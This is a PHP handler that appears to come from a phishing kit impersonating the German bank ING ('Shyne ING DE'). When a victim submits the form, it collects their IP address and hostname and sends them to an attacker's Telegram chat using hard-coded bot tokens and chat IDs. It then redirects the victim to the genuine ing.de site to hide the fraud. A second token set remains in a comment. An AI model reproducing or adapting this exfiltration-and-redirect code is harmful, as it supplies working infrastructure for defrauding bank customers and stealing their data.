<?php

if (isset($_POST['valider'])){

//var_dump($_POST);exit();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

    # code...
$message .= "==========  Shyne ING DE ==========\n";
$message .= "Virificqtion OK\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne ING DE  =========\n";

$apiToken = "6593809347:AAFNtXBk_1cgdHIIVToVHwBbva3iDafzL2Y";
$data = [
    'chat_id' => '-1002142179043',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data) );

/**$apiToken = "6641620939:AAEpjs-7JdXekcGBr9lJKo0IYLQsO6Dm7DA";
$data = [
    'chat_id' => '-1001708576281',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data) );**/


if($response){ 

    echo '<script type="text/javascript">'; 
    echo 'window.location.href = "https://www.ing.de/";';
    echo '</script>';
}
}                                   

?>